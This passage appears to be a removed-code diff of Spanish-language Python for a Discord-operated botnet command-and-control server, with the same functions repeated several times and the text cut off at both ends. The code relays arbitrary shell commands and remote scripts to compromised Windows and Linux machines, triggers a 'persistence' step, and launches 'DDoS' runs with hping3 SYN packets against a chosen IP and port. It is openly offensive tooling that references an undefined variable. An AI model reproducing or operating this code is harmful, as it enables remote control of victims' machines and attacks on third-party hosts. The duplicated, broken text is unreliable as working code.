bot específico.\r\n-    - Ejemplo: `!cerrar_conexion 1`\r\n-\r\n-    **!menu_comandos**\r\n-    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n-\r\n-    **!ayuda**\r\n-    - Muestra este mensaje de ayuda.\r\n-    \"\"\"\r\n-    await ctx.send(help_text)\r\n-\r\n-def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n-    \"\"\"\r\n-    Envía un comando a un conjunto de bots seleccionados.\r\n-\r\n-    :param comando_windows: El comando a enviar a los bots Windows.\r\n-    :type comando_windows: str\r\n-    :param comando_linux: El comando a enviar a los bots Linux.\r\n-    :type comando_linux: str\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Enviando comando a los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione a qué bots enviar el comando:\")\r\n-        print(\"1. Todos los bots\")\r\n-        print(\"2. Solo bots Windows\")\r\n-        print(\"3. Solo bots Linux\")\r\n-        print(\"4. Un bot específico\")\r\n-        print(\"5. Lista de bots específicos\")\r\n-\r\n-        seleccion = input(\"Ingrese su opción: \")\r\n-        bots_seleccionados = []\r\n-\r\n-        if seleccion == \"1\":\r\n-            bots_seleccionados = bots\r\n-        elif seleccion == \"2\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n-        elif seleccion == \"3\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n-        elif seleccion == \"4\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n-                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n-                if bot:\r\n-                    bots_seleccionados.append(bot)\r\n-                else:\r\n-                    print(\"ID de bot no válido.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"ID inválido. Debe ingresar un número.\")\r\n-                return\r\n-        elif seleccion == \"5\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n-                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n-                if not bots_seleccionados:\r\n-                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"Entrada inválida. Debe ingresar números separados por comas.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opción no válida.\")\r\n-            return\r\n-\r\n-        respuestas = {}\r\n-\r\n-        for bot in bots_seleccionados:\r\n-            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n-\r\n-        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n-        for bot, respuesta in respuestas.items():\r\n-            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n-            print(f\"[→] {bot_info}: {respuesta}\")\r\n-\r\n-        print(\"\\n--- Volviendo al menú principal ---\\n\")\r\n-        time.sleep(2)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-\r\n-def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n-    \"\"\"\r\n-    Envía un comando a un bot específico basado en su sistema operativo.\r\n-\r\n-    Determina el sistema operativo del bot y envía el comando adecuado \r\n-    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n-    máximo definido y devuelve la respuesta si se recibe. Maneja la \r\n-    desconexión del bot si ocurre durante la comunicación.\r\n-\r\n-    :param bot: El socket del bot al que se enviará el comando.\r\n-    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n-    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n-             respuesta o si el bot se desconecta.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n-        so = sistemas_operativos.get(bot, \"desconocido\")\r\n-        comando = comando_windows if so == \"windows\" else comando_linux\r\n-        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n-\r\n-        try:\r\n-            bot.send(comando.encode('utf-8'))\r\n-            print(f\"\\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n-\r\n-            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n-            tiempo_maximo = 5  # Segundos\r\n-            tiempo_inicial = time.time()\r\n-\r\n-            while time.time() - tiempo_inicial < tiempo_maximo:\r\n-                if bot_id in respuestas_bots:\r\n-                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n-                    if tipo_comando == \"ddos_start\":\r\n-                        ddos_status[bot_id] = \"running\"\r\n-                    elif tipo_comando == \"ddos_stop\":\r\n-                        ddos_status[bot_id] = \"stopped\"\r\n-                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n-                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n-                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n-\r\n-            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n-\r\n-        except (socket.error, BrokenPipeError):\r\n-            print(f\"[✗] Bot {bot_id} desconectado.\")\r\n-            if bot in bots:\r\n-                bots.remove(bot)\r\n-            if bot in bot_ids:\r\n-                del bot_ids[bot]\r\n-            if bot in sistemas_operativos:\r\n-                del sistemas_operativos[bot]\r\n-            return \"[ERROR] El bot se ha desconectado.\"\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n-\r\n-def cerrar_conexion_bots(bot_id):\r\n-    \"\"\"\r\n-    Cierra la conexión con un bot seleccionado por el usuario.\r\n-    \r\n-    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión\r\n-    mediante un ID o bien escribir \"todos\" para cerrar la conexión con todos\r\n-    los bots conectados.\r\n-    \r\n-    :param bot_id: El ID del bot cuya conexión se desea cerrar.\r\n-    :type bot_id: int\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cerrando conexión con los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente\r\n-        \r\n-        if not bot:  # Si no se encuentra el bot\r\n-            print(f\"ID de bot {bot_id} no válido.\")  # Imprimir un mensaje de error\r\n-            return\r\n-\r\n-        try:\r\n-            bot.close()  # Cerrar la conexión\r\n-            print(f\"Conexión con el bot {bot_id} cerrada.\")  # Imprimir un mensaje de confirmación\r\n-        except Exception as e:\r\n-            print(f\"Error al cerrar la conexión con el bot {bot_id}: {e}\")\r\n-\r\n-        if bot in bots:\r\n-            bots.remove(bot)  # Eliminar el bot de la lista\r\n-\r\n-        if bot in bot_ids:\r\n-            del bot_ids[bot]  # Eliminar el ID del bot\r\n-\r\n-        if bot in sistemas_operativos:\r\n-            del sistemas_operativos[bot]  # Eliminar el SO del bot\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n-\r\n-def listar_bots():\r\n-    \"\"\"\r\n-    Lista los bots conectados al servidor.\r\n-    \"\"\"\r\n-    try:\r\n-        if bots:\r\n-            print(\"\\nBots conectados:\\n\")\r\n-            for bot_conn in bots:\r\n-                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n-                print(f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\")\r\n-        else:\r\n-            print(\"No hay bots conectados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\n-import discord\r\n-from discord.ext import commands\r\n-import logging\r\n-import configparser\r\n-import os\r\n-import socket\r\n-import subprocess\r\n-import threading\r\n-import time\r\n-\r\n-# Cargar configuración\r\n-config = configparser.ConfigParser()\r\n-config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n-\r\n-intents = discord.Intents.default()\r\n-intents.message_content = True\r\n-bot = commands.Bot(command_prefix='!', intents=intents)\r\n-\r\n-# Variables globales\r\n-bots = []  # Lista de bots conectados\r\n-bot_ids = {}  # Diccionario con los IDs de los bots\r\n-sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n-respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n-\r\n-@bot.event\r\n-async def on_ready():\r\n-    logging.info(f'Bot conectado como {bot.user}')\r\n-    print(f'Bot conectado como {bot.user}')\r\n-\r\n-@bot.command(name='listar_bots')\r\n-async def listar_bots_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para listar los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        if bots:\r\n-            response = \"\\nBots conectados:\\n\"\r\n-            for bot_conn in bots:\r\n-                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n-                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n-        else:\r\n-            response = \"No hay bots conectados.\"\r\n-        await ctx.send(response)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-        await ctx.send(\"Error al listar bots.\")\r\n-\r\n-@bot.command(name='enviar_comando')\r\n-async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n-    \"\"\"\r\n-    Comando de Discord para enviar un comando a los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        enviar_comando(comando_windows, comando_linux)\r\n-        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-        await ctx.send(\"Error al enviar comando.\")\r\n-\r\n-@bot.command(name='cerrar_conexion')\r\n-async def cerrar_conexion_command(ctx, bot_id: int):\r\n-    \"\"\"\r\n-    Comando de Discord para cerrar la conexión con un bot específico.\r\n-    \"\"\"\r\n-    try:\r\n-        cerrar_conexion_bots(bot_id)\r\n-        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n-        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n-\r\n-@bot.command(name='menu_comandos')\r\n-async def menu_comandos_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar el menú de comandos.\r\n-    \"\"\"\r\n-    try:\r\n-        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n-        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-        tipo_comando = tipo_comando.content.strip()\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && lsb_release -a\"\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"netstat -ano\"\r\n-                comando_linux = \"netstat -tunapl\"\r\n-            elif orden == \"3\":\r\n-                comando_windows = \"tasklist\"\r\n-                comando_linux = \"ps aux\"\r\n-            elif orden == \"4\":\r\n-                comando_windows = \"dir\"\r\n-                comando_linux = \"ls -lah\"\r\n-            elif orden == \"5\":\r\n-                comando_windows = \"curl ifconfig.me\"\r\n-                comando_linux = \"curl ifconfig.me\"\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-\r\n-            enviar_comando(comando_windows, comando_linux)\r\n-\r\n-        elif tipo_comando == \"2\":\r\n-            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n-                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                objetivo = objetivo.content.strip()\r\n-                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n-                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                puerto = puerto.content.strip()\r\n-                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n-                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                protocolo = protocolo.content.strip().upper()\r\n-                if protocolo not in [\"TCP\", \"UDP\"]:\r\n-                    await ctx.send(\"Protocolo no válido.\")\r\n-                    return\r\n-                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n-                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n-            elif orden == \"2\":\r\n-                comando_windows = \"stop_ddos\"\r\n-                comando_linux = \"stop_ddos\"\r\n-                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n-            elif orden == \"3\":\r\n-                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n-                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_windows = comando_windows.content.strip()\r\n-                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n-                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                comando_linux = comando_linux.content.strip()\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"4\":\r\n-                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n-                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                tipo = tipo.content.strip()\r\n-\r\n-                if tipo == \"1\":\r\n-                    extension = \"py\"\r\n-                    interprete_linux = \"python3 -c\"\r\n-                    interprete_windows = \"python -c\"\r\n-                elif tipo == \"2\":\r\n-                    extension = \"sh\"\r\n-                    interprete_linux = \"bash -c\"\r\n-                    interprete_windows = \"powershell -Command\"\r\n-                elif tipo == \"3\":\r\n-                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n-                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    extension = extension.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n-                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_linux = interprete_linux.content.strip()\r\n-                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n-                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    interprete_windows = interprete_windows.content.strip()\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n-                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                metodo = metodo.content.strip()\r\n-\r\n-                if metodo == \"1\":\r\n-                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n-                    lineas = []\r\n-                    while True:\r\n-                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                        linea = linea.content.strip()\r\n-                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n-                            break\r\n-                        lineas.append(linea)\r\n-                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n-                elif metodo == \"2\":\r\n-                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n-                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-                    ruta = ruta.content.strip()\r\n-                    try:\r\n-                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n-                            script = archivo.read()\r\n-                    except Exception as e:\r\n-                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n-                        return\r\n-                else:\r\n-                    await ctx.send(\"Opción inválida.\")\r\n-                    return\r\n-\r\n-                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n-                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n-\r\n-                comando_windows = f'{interprete_windows} \"{script}\"'\r\n-                comando_linux = f\"{interprete_linux} '{script}'\"\r\n-\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            elif orden == \"5\":\r\n-                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n-                comando_windows = \"persistencia\"\r\n-                comando_linux = \"persistencia\"\r\n-                enviar_comando(comando_windows, comando_linux)\r\n-            else:\r\n-                await ctx.send(\"Opción no válida.\")\r\n-                return\r\n-        else:\r\n-            await ctx.send(\"Opción no válida.\")\r\n-            return\r\n-    except Exception as e:\r\n-        logging.error(f\"Error en el menú de comandos: {e}\")\r\n-        await ctx.send(\"Error en el menú de comandos.\")\r\n-\r\n-@bot.command(name='ayuda')\r\n-async def ayuda_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar la ayuda del bot.\r\n-    \"\"\"\r\n-    help_text = \"\"\"\r\n-    **Comandos disponibles:**\r\n-\r\n-    **!listar_bots**\r\n-    - Lista los bots conectados al servidor.\r\n-\r\n-    **!enviar_comando <comando_windows> <comando_linux>**\r\n-    - Envía un comando a los bots conectados.\r\n-    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n-\r\n-    **!cerrar_conexion <bot_id>**\r\n-    - Cierra la conexión con un bot específico.\r\n-    - Ejemplo: `!cerrar_conexion 1`\r\n-\r\n-    **!menu_comandos**\r\n-    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n-\r\n-    **!ayuda**\r\n-    - Muestra este mensaje de ayuda.\r\n-    \"\"\"\r\n-    await ctx.send(help_text)\r\n-\r\n-def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n-    \"\"\"\r\n-    Envía un comando a un conjunto de bots seleccionados.\r\n-\r\n-    :param comando_windows: El comando a enviar a los bots Windows.\r\n-    :type comando_windows: str\r\n-    :param comando_linux: El comando a enviar a los bots Linux.\r\n-    :type comando_linux: str\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Enviando comando a los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        print(\"\\nSeleccione a qué bots enviar el comando:\")\r\n-        print(\"1. Todos los bots\")\r\n-        print(\"2. Solo bots Windows\")\r\n-        print(\"3. Solo bots Linux\")\r\n-        print(\"4. Un bot específico\")\r\n-        print(\"5. Lista de bots específicos\")\r\n-\r\n-        seleccion = input(\"Ingrese su opción: \")\r\n-        bots_seleccionados = []\r\n-\r\n-        if seleccion == \"1\":\r\n-            bots_seleccionados = bots\r\n-        elif seleccion == \"2\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n-        elif seleccion == \"3\":\r\n-            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n-        elif seleccion == \"4\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n-                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n-                if bot:\r\n-                    bots_seleccionados.append(bot)\r\n-                else:\r\n-                    print(\"ID de bot no válido.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"ID inválido. Debe ingresar un número.\")\r\n-                return\r\n-        elif seleccion == \"5\":\r\n-            listar_bots()\r\n-            try:\r\n-                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n-                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n-                if not bots_seleccionados:\r\n-                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n-                    return\r\n-            except ValueError:\r\n-                print(\"Entrada inválida. Debe ingresar números separados por comas.\")\r\n-                return\r\n-        else:\r\n-            print(\"Opción no válida.\")\r\n-            return\r\n-\r\n-        respuestas = {}\r\n-\r\n-        for bot in bots_seleccionados:\r\n-            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n-\r\n-        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n-        for bot, respuesta in respuestas.items():\r\n-            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n-            print(f\"[→] {bot_info}: {respuesta}\")\r\n-\r\n-        print(\"\\n--- Volviendo al menú principal ---\\n\")\r\n-        time.sleep(2)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-\r\n-def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n-    \"\"\"\r\n-    Envía un comando a un bot específico basado en su sistema operativo.\r\n-\r\n-    Determina el sistema operativo del bot y envía el comando adecuado \r\n-    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n-    máximo definido y devuelve la respuesta si se recibe. Maneja la \r\n-    desconexión del bot si ocurre durante la comunicación.\r\n-\r\n-    :param bot: El socket del bot al que se enviará el comando.\r\n-    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n-    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n-    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n-    :type tipo_comando: str\r\n-    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n-             respuesta o si el bot se desconecta.\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n-        so = sistemas_operativos.get(bot, \"desconocido\")\r\n-        comando = comando_windows if so == \"windows\" else comando_linux\r\n-        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n-\r\n-        try:\r\n-            bot.send(comando.encode('utf-8'))\r\n-            print(f\"\\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n-\r\n-            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n-            tiempo_maximo = 5  # Segundos\r\n-            tiempo_inicial = time.time()\r\n-\r\n-            while time.time() - tiempo_inicial < tiempo_maximo:\r\n-                if bot_id in respuestas_bots:\r\n-                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n-                    if tipo_comando == \"ddos_start\":\r\n-                        ddos_status[bot_id] = \"running\"\r\n-                    elif tipo_comando == \"ddos_stop\":\r\n-                        ddos_status[bot_id] = \"stopped\"\r\n-                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n-                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n-                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n-\r\n-            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n-\r\n-        except (socket.error, BrokenPipeError):\r\n-            print(f\"[✗] Bot {bot_id} desconectado.\")\r\n-            if bot in bots:\r\n-                bots.remove(bot)\r\n-            if bot in bot_ids:\r\n-                del bot_ids[bot]\r\n-            if bot in sistemas_operativos:\r\n-                del sistemas_operativos[bot]\r\n-            return \"[ERROR] El bot se ha desconectado.\"\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n-\r\n-def cerrar_conexion_bots(bot_id):\r\n-    \"\"\"\r\n-    Cierra la conexión con un bot seleccionado por el usuario.\r\n-    \r\n-    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión\r\n-    mediante un ID o bien escribir \"todos\" para cerrar la conexión con todos\r\n-    los bots conectados.\r\n-    \r\n-    :param bot_id: El ID del bot cuya conexión se desea cerrar.\r\n-    :type bot_id: int\r\n-    \"\"\"\r\n-    try:\r\n-        logging.info(\"Cerrando conexión con los bots seleccionados\")\r\n-        if not bots:\r\n-            print(\"No hay bots conectados.\")\r\n-            return\r\n-\r\n-        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente\r\n-        \r\n-        if not bot:  # Si no se encuentra el bot\r\n-            print(f\"ID de bot {bot_id} no válido.\")  # Imprimir un mensaje de error\r\n-            return\r\n-\r\n-        try:\r\n-            bot.close()  # Cerrar la conexión\r\n-            print(f\"Conexión con el bot {bot_id} cerrada.\")  # Imprimir un mensaje de confirmación\r\n-        except Exception as e:\r\n-            print(f\"Error al cerrar la conexión con el bot {bot_id}: {e}\")\r\n-\r\n-        if bot in bots:\r\n-            bots.remove(bot)  # Eliminar el bot de la lista\r\n-\r\n-        if bot in bot_ids:\r\n-            del bot_ids[bot]  # Eliminar el ID del bot\r\n-\r\n-        if bot in sistemas_operativos:\r\n-            del sistemas_operativos[bot]  # Eliminar el SO del bot\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\n-import discord\r\n-from discord.ext import commands\r\n-import logging\r\n-import configparser\r\n-import os\r\n-import socket\r\n-import subprocess\r\n-import threading\r\n-import time\r\n-\r\n-# Cargar configuración\r\n-config = configparser.ConfigParser()\r\n-config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n-\r\n-intents = discord.Intents.default()\r\n-intents.message_content = True\r\n-bot = commands.Bot(command_prefix='!', intents=intents)\r\n-\r\n-# Variables globales\r\n-bots = []  # Lista de bots conectados\r\n-bot_ids = {}  # Diccionario con los IDs de los bots\r\n-sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n-respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n-\r\n-@bot.event\r\n-async def on_ready():\r\n-    logging.info(f'Bot conectado como {bot.user}')\r\n-    print(f'Bot conectado como {bot.user}')\r\n-\r\n-@bot.command(name='listar_bots')\r\n-async def listar_bots_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para listar los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        if bots:\r\n-            response = \"\\nBots conectados:\\n\"\r\n-            for bot_conn in bots:\r\n-                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n-                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n-        else:\r\n-            response = \"No hay bots conectados.\"\r\n-        await ctx.send(response)\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al listar bots: {e}\")\r\n-        await ctx.send(\"Error al listar bots.\")\r\n-\r\n-@bot.command(name='enviar_comando')\r\n-async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n-    \"\"\"\r\n-    Comando de Discord para enviar un comando a los bots conectados.\r\n-    \"\"\"\r\n-    try:\r\n-        enviar_comando(comando_windows, comando_linux)\r\n-        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al enviar comando: {e}\")\r\n-        await ctx.send(\"Error al enviar comando.\")\r\n-\r\n-@bot.command(name='cerrar_conexion')\r\n-async def cerrar_conexion_command(ctx, bot_id: int):\r\n-    \"\"\"\r\n-    Comando de Discord para cerrar la conexión con un bot específico.\r\n-    \"\"\"\r\n-    try:\r\n-        cerrar_conexion_bots(bot_id)\r\n-        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n-    except Exception as e:\r\n-        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n-        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n-\r\n-@bot.command(name='menu_comandos')\r\n-async def menu_comandos_command(ctx):\r\n-    \"\"\"\r\n-    Comando de Discord para mostrar el menú de comandos.\r\n-    \"\"\"\r\n-    try:\r\n-        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n-        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-        tipo_comando = tipo_comando.content.strip()\r\n-\r\n-        if tipo_comando == \"1\":\r\n-            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n-            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n-            orden = orden.content.strip()\r\n-            comando_windows = \"\"\r\n-            comando_linux = \"\"\r\n-\r\n-            if orden == \"1\":\r\n-                comando_windows = \"systeminfo\"\r\n-                comando_linux = \"uname -a && 